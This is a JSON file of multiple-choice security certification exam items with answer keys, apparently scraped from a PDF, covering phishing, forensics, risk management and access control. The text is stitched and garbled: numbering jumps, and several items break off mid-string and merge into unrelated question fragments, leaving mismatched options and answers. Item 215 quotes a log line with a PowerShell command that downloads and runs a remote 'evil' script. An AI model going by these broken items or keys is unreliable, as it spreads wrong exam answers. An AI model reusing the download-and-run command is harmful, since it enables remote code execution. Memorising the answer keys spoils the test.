Chief Intelligence Security Officer (CISO) must reduce this behaviour. Which of the following should the CISO do first?"], "opts": [{"k": "A", "t": "Update the acceptable use policy."}, {"k": "B", "t": "Deploy a password management solution."}, {"k": "C", "t": "Issue warning letters to affected users."}, {"k": "D", "t": "Implement a phishing awareness campaign."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 61, "stem": ["An organization's internet-facing website was compromised when an attacker exploited a buffer overflow. Which of the following should the organization deploy to best protect against similar attacks in the future?"], "opts": [{"k": "A", "t": "NGFW"}, {"k": "B", "t": "WAF"}, {"k": "C", "t": "TLS"}, {"k": "D", "t": "SD-WAN"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 62, "stem": ["An organization experiences a suspected data breach that affects sensitive client information. The incident response team must preserve logs, server images, and email communications related to the breach. Which of the following best describes this course of action?"], "opts": [{"k": "A", "t": "Maintaining the chain of custody"}, {"k": "B", "t": "Performing root cause analysis"}, {"k": "C", "t": "Enforcing a legal hold"}, {"k": "D", "t": "Conducting a containment activity"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 63, "stem": ["Which of the following security concepts is accomplished with the installation of a RADIUS server?"], "opts": [{"k": "A", "t": "CIA"}, {"k": "B", "t": "AAA"}, {"k": "C", "t": "ACL"}, {"k": "D", "t": "PEM"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 64, "stem": ["A penetration tester, who did not have an access badge, managed to follow a group of employees through multiple badged-access doors and into the data center without being stopped. The tester mentions this finding during the after-action review with the Chief Information Security Officer (CISO). Which of the following issues should the CISO address as a result of this finding?"], "opts": [{"k": "A", "t": "Role-based access"}, {"k": "B", "t": "Shoulder surfing"}, {"k": "C", "t": "Insider threat"}, {"k": "D", "t": "Social engineering"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 65, "stem": ["A company processes personal data from customers in multiple countries. Which of the following actions is most critical for maintaining legal compliance with global privacy regulations?"], "opts": [{"k": "A", "t": "Storing all customer data on encrypted local servers"}, {"k": "B", "t": "Hiring a data privacy officer to review contracts"}, {"k": "C", "t": "Ensuring DPAs are in place with third-party vendors"}, {"k": "D", "t": "Using strong passwords and firewalls on all endpoints"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 66, "stem": ["Which of the following is a potential benefit of implementing a SOAR solution?"], "opts": [{"k": "A", "t": "Time saving and efficiency"}, {"k": "B", "t": "Employee retention"}, {"k": "C", "t": "Continuous integration and delivery"}, {"k": "D", "t": "Ongoing supportability"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 67, "stem": ["A company needs to determine whether authentication weaknesses in a customer-facing web application exist. Which of the following is the best technique to use?"], "opts": [{"k": "A", "t": "Static analysis"}, {"k": "B", "t": "Packet capture"}, {"k": "C", "t": "Agent-based scanning"}, {"k": "D", "t": "Dynamic analysis"}, {"k": "E", "t": "Network-based scanning"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 68, "stem": ["Help desk analysts must deploy new devices to all employees. There is no current record-keeping solution at the organization due to a small number of employees. The organization must install a new agent to improve secure endpoint detection. Which of the following will assist the help desk analysts with deployment?"], "opts": [{"k": "A", "t": "Decommissioning procedure"}, {"k": "B", "t": "Acquisition procedure"}, {"k": "C", "t": "Inventory tracking"}, {"k": "D", "t": "Vendor installation script"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 69, "stem": ["Due to multiple tickets a day on password resets, the company Chief Security Officer wants to reduce workload while enhancing the security posture of the company. Which of the following will most effectively achieve these goals?"], "opts": [{"k": "A", "t": "Allow for password reuse."}, {"k": "B", "t": "Increase the password expiration."}, {"k": "C", "t": "Change the minimum password length."}, {"k": "D", "t": "Switch to password less methods."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 70, "stem": ["Which of the following would help determine whether a data synchronization strategy is synchronous or asynchronous within a BIA?"], "opts": [{"k": "A", "t": "MTTR"}, {"k": "B", "t": "MTBF"}, {"k": "C", "t": "RPO"}, {"k": "D", "t": "SLA"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 71, "stem": ["Which of the following are examples of operational controls that are appropriate to implement in an environment where financial processing activities occur? (Select two)."], "opts": [{"k": "A", "t": "Key escrow"}, {"k": "B", "t": "Tokenization"}, {"k": "C", "t": "Dual control"}, {"k": "D", "t": "Mandatory vacations"}, {"k": "E", "t": "Access badge readers"}, {"k": "F", "t": "Biometrics"}], "ans": ["C", "D"], "exp": "", "src": "PDF"}, {"n": 72, "stem": ["Which of the following will best ensure a controlled version release of a new software application?"], "opts": [{"k": "A", "t": "Business continuity planning"}, {"k": "B", "t": "Quantified risk analysis"}, {"k": "C", "t": "Static code analysis"}, {"k": "D", "t": "Change management procedures"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 73, "stem": ["A security administrator wants to increase a company's technical defences after two users experienced payroll fraud due to phishing attacks. Which of the following should the administrator do?"], "opts": [{"k": "A", "t": "Conduct internal phishing campaigns with continuous training for all users on how to recognize phishing attempts."}, {"k": "B", "t": "Deploy more secure email gateways and block any email coming from unknown or suspicious domains."}, {"k": "C", "t": "Install advanced EDR software on all user workstations and configure alerts to report suspicious communications."}, {"k": "D", "t": "Keep web browsers updated to patch known vulnerabilities and use DNS block lists to prevent users from visiting known malicious sites."}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 74, "stem": ["Which of the following is the stage in an investigation when forensic images are obtained?"], "opts": [{"k": "A", "t": "Acquisition"}, {"k": "B", "t": "Preservation"}, {"k": "C", "t": "Reporting"}, {"k": "D", "t": "E-discovery"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 75, "stem": ["An important patch for a critical application has just been released, and a systems administrator is identifying all of the systems requiring the patch. Which of the following must be maintained in order to ensure that all systems requiring the patch are updated?"], "opts": [{"k": "A", "t": "Asset inventory"}, {"k": "B", "t": "Network enumeration"}, {"k": "C", "t": "Data certification"}, {"k": "D", "t": "Procurement process"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 76, "stem": ["Which of the following threat actors is the most likely to be hired by a foreign government to attack critical systems located in other countries?"], "opts": [{"k": "A", "t": "Hacktivist"}, {"k": "B", "t": "Whistle blower"}, {"k": "C", "t": "Organized crime"}, {"k": "D", "t": "Unskilled attacker"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 77, "stem": ["A government official receives a blank envelope containing photos and a note instructing the official to wire a large sum of money by midnight to prevent the photos from being leaked on the internet. Which of the following best describes the threat actor's intent?"], "opts": [{"k": "A", "t": "Organized crime"}, {"k": "B", "t": "Philosophical beliefs"}, {"k": "C", "t": "Espionage"}, {"k": "D", "t": "Blackmail"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 78, "stem": ["A technician is opening ports on a firewall for a new system being deployed and supported by a SaaS provider. Which of the following is a risk in the new system?"], "opts": [{"k": "A", "t": "Default credentials"}, {"k": "B", "t": "Non-segmented network"}, {"k": "C", "t": "Supply chain vendor"}, {"k": "D", "t": "Vulnerable software"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 79, "stem": ["After a recent vulnerability scan, a security engineer needs to harden the routers within the corporate network. Which of the following is the most appropriate to disable?"], "opts": [{"k": "A", "t": "Console access"}, {"k": "B", "t": "Routing protocols"}, {"k": "C", "t": "VLANs"}, {"k": "D", "t": "Web-based administration"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 80, "stem": ["Which of the following would best provide insights on the potential impact of a vendor's processes on the security of a buyer's network?"], "opts": [{"k": "A", "t": "Non-disclosure agreement"}, {"k": "B", "t": "Supply chain assessment"}, {"k": "C", "t": "Service—level agreement"}, {"k": "D", "t": "Penetration testing"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 81, "stem": ["Which of the following techniques would attract the attention of a malicious attacker in an insider threat scenario?"], "opts": [{"k": "A", "t": "Creating a false text file in /docs/ salaries"}, {"k": "B", "t": "Setting weak passwords in /etc/ shadow"}, {"k": "C", "t": "Scheduling vulnerable jobs in /etc/ crontab"}, {"k": "D", "t": "Adding a fake account to /etc/passwd"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 82, "stem": ["A Chief Information Security Officer would like to conduct frequent, detailed reviews of systems and procedures to track compliance objectives- Which of the following is the best method to achieve this objective?"], "opts": [{"k": "A", "t": "Third-party attestation"}, {"k": "B", "t": "Penetration testing"}, {"k": "C", "t": "Internal auditing"}, {"k": "D", "t": "Vulnerability scans"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 83, "stem": ["An organization's primary site is located in an area that experiences frequent hurricane activity. Which of the following will ensure the most resiliency?"], "opts": [{"k": "A", "t": "Geographic dispersion"}, {"k": "B", "t": "On-site backups"}, {"k": "C", "t": "Uninterruptible power supplies"}, {"k": "D", "t": "A hot site with high availability"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 84, "stem": ["Which of the following best explains how removable devices can serve as an attack vector?"], "opts": [{"k": "A", "t": "They are often shared between multiple systems without proper scanning."}, {"k": "B", "t": "They can introduce malware into isolated systems without needing internet access."}, {"k": "C", "t": "They rely on encrypted transfer protocols that prevent inspection by security tools."}, {"k": "D", "t": "They are limited to read-only access by modern operating systems by default."}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 85, "stem": ["A quick response (Q.R) code is available in a public space. Which of the following security attacks does the QR code best describe?"], "opts": [{"k": "A", "t": "Impersonation"}, {"k": "B", "t": "Phishing"}, {"k": "C", "t": "Brute-force"}, {"k": "D", "t": "Denial of service (DoS)"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 86, "stem": ["A company provides monthly reports about automated teller machine (ATM) transactions to different banks and is concerned about the privacy of user data in its report. Which of the following techniques will most likely address this concern?"], "opts": [{"k": "A", "t": "Filtering"}, {"k": "B", "t": "Masking"}, {"k": "C", "t": "Hashing"}, {"k": "D", "t": "Encoding"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 87, "stem": ["Which of the following best explains why VM escape is a significant security concern?"], "opts": [{"k": "A", "t": "It permits a VM to interact with the host system or other guest machines."}, {"k": "B", "t": "It enables a VM to bypass the local firewall settings within the guest OS."}, {"k": "C", "t": "It causes resource starvation when multiple VMs request memory simultaneously."}, {"k": "D", "t": "It allows the VM to directly control physical network interfaces."}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 88, "stem": ["Two companies with separate, private cloud deployments plan to collaborate on a short-term project. Company A creates a new, public cloud deployment for Company B to access during this project. Which of the following describes the new cloud architecture for both companies?"], "opts": [{"k": "A", "t": "Community"}, {"k": "B", "t": "Public"}, {"k": "C", "t": "Private"}, {"k": "D", "t": "Hybrid"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 89, "stem": ["A systems administrator must write a process to return a service to its original state after a failed change. Which of the following processes should the administrator document?"], "opts": [{"k": "A", "t": "Disaster recovery"}, {"k": "B", "t": "Maintenance window"}, {"k": "C", "t": "Rollback"}, {"k": "D", "t": "Fail forward"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 90, "stem": ["Which of the following activities will most likely trigger alarms if an event threshold is exceeded?"], "opts": [{"k": "A", "t": "Archiving"}, {"k": "B", "t": "Log aggregation"}, {"k": "C", "t": "Reporting"}, {"k": "D", "t": "Alert tunning"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 91, "stem": ["Which of the following can be used to compromise a system that is running an RTOS?"], "opts": [{"k": "A", "t": "Cross-site scripting"}, {"k": "B", "t": "Memory injection"}, {"k": "C", "t": "Replay attack"}, {"k": "D", "t": "Ransomware"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 92, "stem": ["Which of the following is most likely to leverage a zero-day vulnerability as part of initial attack vectors?"], "opts": [{"k": "A", "t": "Insider"}, {"k": "B", "t": "Unskilled attacker"}, {"k": "C", "t": "Advanced persistent threat (APT)"}, {"k": "D", "t": "Hacktivist"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 93, "stem": ["Which of the following steps in the incident response process involves placing a system on a private virtual local area network (VLAN)?"], "opts": [{"k": "A", "t": "Containment"}, {"k": "B", "t": "Identification"}, {"k": "C", "t": "Investigation"}, {"k": "D", "t": "Eradication"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 94, "stem": ["An organization is required to provide assurance that its controls are properly designed and operating effectively. Which of the following reports will best achieve this objective?"], "opts": [{"k": "A", "t": "Red teaming"}, {"k": "B", "t": "Penetration testing"}, {"k": "C", "t": "Independent audit"}, {"k": "D", "t": "Vulnerability assessment"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 95, "stem": ["Which of the following is the best way to consistently determine on a daily basis whether security settings on servers have been modified?"], "opts": [{"k": "A", "t": "Automation"}, {"k": "B", "t": "Compliance checklist"}, {"k": "C", "t": "Attestation"}, {"k": "D", "t": "Manual audit"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 96, "stem": ["Which of the following would enable a data centre to remain operational through a multiday power outage?"], "opts": [{"k": "A", "t": "Generator"}, {"k": "B", "t": "Uninterruptible power supply"}, {"k": "C", "t": "Replication"}, {"k": "D", "t": "Parallel processing"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 97, "stem": ["Which of the following practices would be best to prevent an insider from introducing malicious code into a company's development process?"], "opts": [{"k": "A", "t": "Code scanning for vulnerabilities"}, {"k": "B", "t": "Open-source component usage"}, {"k": "C", "t": "Quality assurance testing"}, {"k": "D", "t": "Peer review and approval"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 98, "stem": ["The CIRT is reviewing an incident that involved a human resources recruiter exfiltrating sensitive company data. The CIRT found that the recruiter was able to use HTTP over port 53 to upload documents to a web server. Which of the following security infrastructure devices could have identify d and blocked this activity?"], "opts": [{"k": "A", "t": "WAF utilizing SSL decryption"}, {"k": "B", "t": "NGFW utilizing application inspection"}, {"k": "C", "t": "UTM utilizing a threat feed"}, {"k": "D", "t": "SD-WAN utilizing IPSec"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 99, "stem": ["A security administrator wants to implement a security information and event management (SIEM). The administrator must first collect network traffic on the switch to gain visibility of the network. Which of the following is the most appropriate method?"], "opts": [{"k": "A", "t": "Syslog"}, {"k": "B", "t": "Port mirroring"}, {"k": "C", "t": "Port forwarding"}, {"k": "D", "t": "Load balancer logs"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 100, "stem": ["After multiple phishing simulations, the Chief Security Officer announces a new program that incentivizes employees to not click phishing links in the upcoming quarter. Which of the following security awareness execution techniques does this represent?"], "opts": [{"k": "A", "t": "Computer-based training"}, {"k": "B", "t": "Insider threat awareness"}, {"k": "C", "t": "SOAR playbook"}, {"k": "D", "t": "Gamification"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 101, "stem": ["A Chief Information Officer wants to ensure that network devices cannot connect to the public internet and the local network to directly perform firmware updates. The IT team must manually perform the update process by using a portable device. Which of the following architecture types best fits this description?"], "opts": [{"k": "A", "t": "Microservices"}, {"k": "B", "t": "Air-gapped"}, {"k": "C", "t": "Software-defined networking"}, {"k": "D", "t": "Serverless"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 102, "stem": ["During a routine audit, an analyst discovers that a department at a high school uses a simulation program that was not properly vetted before deployment. Which of the following threats is this an example of?"], "opts": [{"k": "A", "t": "Espionage"}, {"k": "B", "t": "Data exfiltration"}, {"k": "C", "t": "Shadow IT"}, {"k": "D", "t": "Zero-day"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 103, "stem": ["During a risk treatment exercise, an administrator discovers a risk that cannot be mitigated. Which of the following best describes this situation?"], "opts": [{"k": "A", "t": "Residual risk"}, {"k": "B", "t": "Risk appetite"}, {"k": "C", "t": "Reviewed risk"}, {"k": "D", "t": "Risk register"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 104, "stem": ["An engineer submits a change request for a software update to the change advisory board (CAB). The CAB rejects the request, despite the change request including technical requirements. Which of the following is most likely missing from the request?"], "opts": [{"k": "A", "t": "Rollback strategy"}, {"k": "B", "t": "Fail forward plan"}, {"k": "C", "t": "Test results"}, {"k": "D", "t": "Developer approval"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 105, "stem": ["A company informs employees when they can update their company-owned devices with the newest software. Which of the following does this scenario best describe?"], "opts": [{"k": "A", "t": "Onboarding process"}, {"k": "B", "t": "Device sideloading"}, {"k": "C", "t": "Change management"}, {"k": "D", "t": "Playbook guidelines"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 106, "stem": ["Which of the following takes the outcomes of a third-party risk assessment as input?"], "opts": [{"k": "A", "t": "Statement of work"}, {"k": "B", "t": "Service-level agreement"}, {"k": "C", "t": "Vendor registry"}, {"k": "D", "t": "Compliance attestation"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 107, "stem": ["After a recent security breach, a security administrator needs to perform a risk assessment in order to determine the threats posed to computing assets. Which of the following tools is best for this task?"], "opts": [{"k": "A", "t": "Security information and event management"}, {"k": "B", "t": "Endpoint detection and response"}, {"k": "C", "t": "Vulnerability scanner"}, {"k": "D", "t": "Data loss prevention"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 108, "stem": ["An audit reveals that a user who transferred from the finance department to the sales department still retains access to financial information. Which of the following actions should a systems administrator take first?"], "opts": [{"k": "A", "t": "Deny the user access to financial information."}, {"k": "B", "t": "Contact the user to obtain the financial information."}, {"k": "C", "t": "Open a help desk ticket for the employee transfer."}, {"k": "D", "t": "Add the employee to the sales group and remove them from the finance group."}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 109, "stem": ["A security analyst discovers an application written in C that does not properly validate the length of user input before copying it into a fixed-size array. To which of the following is the application vulnerable?"], "opts": [{ : "Built-in tools"}, {"k": "B", "t": "External media An attacker injects malware into software code that was developed by a third party. Which of the"}, {"k": "C", "t": "Supply chain"}, {"k": "D", "t": "Living-off-the-land tools"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 123, "stem": ["A large company with limited resources needs to identify and report security vulnerabilities on the company's internet-facing web application. Which of the following should the company implement?"], "opts": [{"k": "A", "t": "Dashboard"}, {"k": "B", "t": "Security awareness training"}, {"k": "C", "t": "Outsourcing"}, {"k": "D", "t": "Bug bounty program"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 124, "stem": ["Which of the following is the best way to sanitize an SSD to prevent the exposure of sensitive data while allowing the drive to be reused?"], "opts": [{"k": "A", "t": "Secure erasing"}, {"k": "B", "t": "Degaussing"}, {"k": "C", "t": "Formatting"}, {"k": "D", "t": "File wiping"}, {"k": "E", "t": "Encrypting"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 125, "stem": ["A malicious insider in an organization causes a security breach after normal working hours. This insider does not normally log in after hours. Which of the following capabilities should the organization implement to better detect this activity?"], "opts": [{"k": "A", "t": "File integrity monitoring"}, {"k": "B", "t": "Intrusion detection system"}, {"k": "C", "t": "User behavior analytics"}, {"k": "D", "t": "Endpoint detection and response"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 126, "stem": ["A company uses multiple providers to send its marketing, internal, and support emails. Many of the emails are marked as spam. Which of the following changes should the company make to ensure legitimate emails are validated?"], "opts": [{"k": "A", "t": "Disable DKIM to avoid signature conflicts."}, {"k": "B", "t": "Implement DMARC with a \"reject\" policy to enforce sender validation."}, {"k": "C", "t": omes to evidence during a digital forensic investigation?"], "opts": [{"k": "A", "t": "Change management"}, {"k": "B", "t": "Availability"}, {"k": "C", "t": "Chain of custody"}, {"k": "D", "t": "Reporting"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 152, "stem": ["A penetration tester examined the security posture of a company. The tester completed the following: Checked the locks on perimeter doors Located blind spots on security cameras Attempted to open secured server rack doors Which Of the following describes the type Of test the penetration tester most likely conducted?"], "opts": [{"k": "A", "t": "Defensive"}, {"k": "B", "t": "physical"}, {"k": "C", "t": "Compliance"}, {"k": "D", "t": "Offensive"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 153, "stem": ["A security technician determines that no additional patches can be applied to an application and the risks of operating as such must be accepted. Additionally, only a limited number of network services should utilize the application. Which of the following best describes this type of mitigation?"], "opts": [{"k": "A", "t": "Patching"}, {"k": "B", "t": "Segmentation"}, {"k": "C", "t": "Isolation"}, {"k": "D", "t": "Monitoring"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 154, "stem": ["A now appliance is deployed with hardened settings. The security team wants to prevent a decrease in its security posture over time. Which of the following will best help achieve this goal?"], "opts": [{"k": "A", "t": "Logging retention"}, {"k": "B", "t": "Monitoring configuration"}, {"k": "C", "t": "Least privilege"}, {"k": "D", "t": "Network segmentation"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 155, "stem": ["An employee asks a security analyst to scan a suspicious email that contains a link to a file on a filesharing site. The analyst determines that the file is safe after downloading and scanning the file with antivirus software. When the employee opens the file, their device is infected with ransomwar king uses encryption, while data tokenization replaces data with null values."}, {"k": "C", "t": "Data masking uses one-to-one data mapping while data tokenization uses one-to-many data mapping."}, {"k": "D", "t": "Data masking implements a random function, while data tokenization implements a pseudorandom function-"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 212, "stem": ["In order to maintain system stability, a company's software developers cannot merge updates into the code base Without supervisor approval. Which Of the following is the best description Of this practice?"], "opts": [{"k": "A", "t": "Separation of duties"}, {"k": "B", "t": "Change management"}, {"k": "C", "t": "Vulnerability remediation"}, {"k": "D", "t": "Collusion prevention"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 213, "stem": ["Which of the following describes how a risk event might affect operations and limit the overall risk score?"], "opts": [{"k": "A", "t": "Severity"}, {"k": "B", "t": "Likelihood"}, {"k": "C", "t": "Impact"}, {"k": "D", "t": "Probability"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 214, "stem": ["Which Of the following is an adversary leveraging When they inject malicious code into regular vendor updates?"], "opts": [{"k": "A", "t": "Supply chain"}, {"k": "B", "t": "Zero-day"}, {"k": "C", "t": "Sideloading"}, {"k": "D", "t": "Operating system"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 215, "stem": ["A security analyst reviews the following endpoint log: PowerShell —exec bypass —Command *t IEX (New— OEiect NetWebCiient) .DownioadString (http://17C.30.40.50/evii.psl\") Which of the following logs will help confirm an established connection to IP 176.30.40.50?"], "opts": [{"k": "A", "t": "System event logs"}, {"k": "B", "t": "EDR logs"}, {"k": "C", "t": "Firewall logs"}, {"k": "D", "t": "Application logs"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 216, "stem": ["While troubleshooting an internal resources poor performance for an end user, a icious incident reporting."}, {"k": "C", "t": "Conduct end-user training regarding spear-phishing attempts to raise awareness."}, {"k": "D", "t": "Require remote workers to use a VPN when connecting to the organization's networks."}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 223, "stem": ["A software company currently secures access using a combination of traditional username/password configurations and one-time passwords for MFA. However, employees still struggle to maintain both a password manager and the authenticator application. The company wants to migrate to a single. Integrated authentication solution that is more secure and provides a smoother login experience for its employees. Which of the following solutions will best satisfy the company's needs?"], "opts": [{"k": "A", "t": "Migrating to FIDO2 passkeys, utilizing built-in device biometrics for user authentication"}, {"k": "B", "t": "Implementing SMS-based one-time passwords as the primary second factor for all logins"}, {"k": "C", "t": "Implementing SAML federation across authentication servers so employees can use SSO to access applications"}, {"k": "D", "t": "Deploying a PKI system that requires all employees to use smart cards for login access"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 224, "stem": ["Which of the following best describes the practice of preserving and documenting the handling of forensic evidence?"], "opts": [{"k": "A", "t": "Acquisition of evidence"}, {"k": "B", "t": "E-discovery"}, {"k": "C", "t": "Chain of custody"}, {"k": "D", "t": "Forensic tabletop exercises"}], "ans": ["C"], "exp": "", "src": "PDF"}, {"n": 225, "stem": ["Which of the following concepts protects sensitive information from unauthorized disclosure?"], "opts": [{"k": "A", "t": "Integrity"}, {"k": "B", "t": "Availability"}, {"k": "C", "t": "Authentication"}, {"k": "D", "t": "Confidentiality"}], "ans": ["D"], "exp": "", "src": "PDF"}, {"n": 228, "stem": ["Which of the following is an example of change management?"], "opts": [{"k": "A", "t": "Implementing an update after a board grants approval"}, {"k": "B", "t": "Setting a new password for a user"}, {"k": "C", "t": "Performing a penetration test before deploying a patch"}, {"k": "D", "t": "Auditing all system equipment before sending the list to the Chief Executive Officer"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 229, "stem": ["A company notices that employees unknowingly visit phishing sites through shortened web addresses sent via personal webmail accounts accessed during their lunch break. The security team wants to minimize this risk but allow limited personal browsing Which of the following will best enhance security in this situation?"], "opts": [{"k": "A", "t": "Implementing centralized web filtering with URL categorization and reputation scoring"}, {"k": "B", "t": "Enforcing strict firewall rules to block all domains not explicitly listed as trusted"}, {"k": "C", "t": "Enabling endpoint antivirus scanning with real-time protection for browser activity"}, {"k": "D", "t": "Deploying email filtering policies that prevent messages containing external links"}], "ans": ["A"], "exp": "", "src": "PDF"}, {"n": 230, "stem": ["Which of the following best reduces the likelihood of data theft in the event of a lost device?"], "opts": [{"k": "A", "t": "File hashing"}, {"k": "B", "t": "Volume encryption"}, {"k": "C", "t": "Digital signatures"}, {"k": "D", "t": "Data masking"}], "ans": ["B"], "exp": "", "src": "PDF"}, {"n": 231, "stem": ["A security analyst receives an alert that an employee has clicked on a phishing email and exposed their credentials. Which of the following should the analyst do?"], "opts": [{"k": "A", "t": "Notify all employees about the phishing attack and instruct them to avoid suspicious emails."}, {"k": "B", "t": "Wait for the confirmation from the employee before making any changes to their account."}, {"k": "C", "t": "Reimage the employee's workstation to ensure no malware is present."}, {
